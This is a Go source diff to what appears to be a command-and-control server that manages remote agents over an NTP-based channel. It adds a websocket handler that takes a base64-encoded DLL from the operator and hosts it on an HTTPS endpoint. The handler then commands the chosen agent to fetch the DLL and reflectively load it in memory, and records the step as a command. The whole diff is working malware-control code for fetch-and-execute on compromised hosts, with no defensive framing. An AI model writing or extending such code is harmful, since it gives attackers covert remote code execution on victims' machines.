@@ -2,7 +2,9 @@ package api
 
 import (
 	"bytes"
+	"encoding/base64"
 	"encoding/json"
+	"fmt"
 	"log"
 	"net/http"
 	"sync"
@@ -25,6 +27,7 @@ var upgrader = websocket.Upgrader{
 type WebSocketServer struct {
 	db        *server.Database
 	ntpServer *server.NTPServer
+	apiServer *APIServer
 	clients   map[*websocket.Conn]bool
 	broadcast chan []byte
 	mutex     sync.Mutex
@@ -38,6 +41,10 @@ func NewWebSocketServer(db *server.Database, ntpServer *server.NTPServer) *WebSo
 		clients:   make(map[*websocket.Conn]bool),
 		broadcast: make(chan []byte),
 	}
+}
+
+func (s *WebSocketServer) SetAPIServer(apiServer *APIServer) {
+	s.apiServer = apiServer
 }
 
 // Start starts the WebSocket server
@@ -96,7 +103,7 @@ func (s *WebSocketServer) sendPeriodicAgentUpdates() {
 		// Add pretty-printing for better readability
 		var prettyJSON bytes.Buffer
 		json.Indent(&prettyJSON, jsonData, "", "  ")
-		log.Printf("SERVER → CLIENT: Broadcasting WebSocket message:\n%s", prettyJSON.String())
+		//log.Printf("SERVER → CLIENT: Broadcasting WebSocket message:\n%s", prettyJSON.String())
 
 		s.broadcast <- jsonData
 	}
@@ -181,6 +188,8 @@ func (s *WebSocketServer) handleClientMessage(conn *websocket.Conn, message []by
 		s.handleKillAgent(conn, data)
 	case "groupAgent":
 		s.handleGroupAgent(conn, data)
+	case "executeReflectiveLoading":
+		s.handleReflectiveLoading(conn, data)
 	default:
 		log.Printf("Unknown message type: %s", msgType)
 	}
@@ -379,4 +388,101 @@ func (s *WebSocketServer) sendErrorResponse(conn *websocket.Conn, errorMsg strin
 	}
 
 	conn.WriteMessage(websocket.TextMessage, jsonData)
+}
+
+// ReflectiveLoadingRequest represents a request to execute reflective loading
+type ReflectiveLoadingRequest struct {
+	AgentID      string `json:"agentId"`
+	Payload      string `json:"payload"` // Base64-encoded DLL
+	FunctionName string `json:"functionName"`
+}
+
+// handleReflectiveLoading processes a reflective loading request
+func (s *WebSocketServer) handleReflectiveLoading(conn *websocket.Conn, data map[string]interface{}) {
+	log.Printf("SERVER RECEIVED: Reflective loading request")
+
+	// Parse request data
+	agentID, ok := data["agentId"].(string)
+	if !ok {
+		s.sendErrorResponse(conn, "Missing agentId")
+		return
+	}
+
+	payload, ok := data["payload"].(string)
+	if !ok {
+		s.sendErrorResponse(conn, "Missing payload")
+		return
+	}
+
+	functionName, ok := data["functionName"].(string)
+	if !ok {
+		s.sendErrorResponse(conn, "Missing functionName")
+		return
+	}
+
+	// Decode the base64 payload
+	dllBytes, err := base64.StdEncoding.DecodeString(payload)
+	if err != nil {
+		s.sendErrorResponse(conn, fmt.Sprintf("Failed to decode payload: %v", err))
+		return
+	}
+
+	log.Printf("Processing reflective loading request for agent %s, function: %s, payload size: %d bytes",
+		agentID, functionName, len(dllBytes))
+
+	// Register the payload with the HTTPS server
+	payloadID, serverURL, err := s.apiServer.RegisterReflectivePayload(dllBytes, functionName)
+	if err != nil {
+		s.sendErrorResponse(conn, fmt.Sprintf("Failed to register payload: %v", err))
+		return
+	}
+
+	// Acknowledge receipt to the client
+	response := map[string]interface{}{
+		"type":         "reflectiveLoadingStatus",
+		"agentId":      agentID,
+		"status":       "pending",
+		"message":      "Payload registered, sending command to agent",
+		"timestamp":    time.Now(),
+		"payloadId":    payloadID,
+		"functionName": functionName,
+	}
+
+	jsonData, err := json.Marshal(response)
+	if err != nil {
+		log.Printf("Error marshaling response: %v", err)
+		return
+	}
+
+	conn.WriteMessage(websocket.TextMessage, jsonData)
+
+	// Send the web connect command to the agent
+	err = s.ntpServer.SendWebConnectCommand(agentID, serverURL)
+	if err != nil {
+		// Send error response to client
+		errResponse := map[string]interface{}{
+			"type":      "reflectiveLoadingResponse",
+			"agentId":   agentID,
+			"success":   false,
+			"message":   fmt.Sprintf("Failed to send command to agent: %v", err),
+			"timestamp": time.Now(),
+		}
+
+		jsonData, _ := json.Marshal(errResponse)
+		conn.WriteMessage(websocket.TextMessage, jsonData)
+		return
+	}
+
+	// Add a command history entry
+	cmdMsg := map[string]interface{}{
+		"type":      "commandResponse", // Use existing command history mechanism
+		"agentId":   agentID,
+		"command":   fmt.Sprintf("ReflectiveLoad(%s)", functionName),
+		"output":    "Reflective loading operation initiated",
+		"success":   true,
+		"timestamp": time.Now(),
+	}
+
+	cmdData, _ := json.Marshal(cmdMsg)
+	s.broadcast <- cmdData
 }
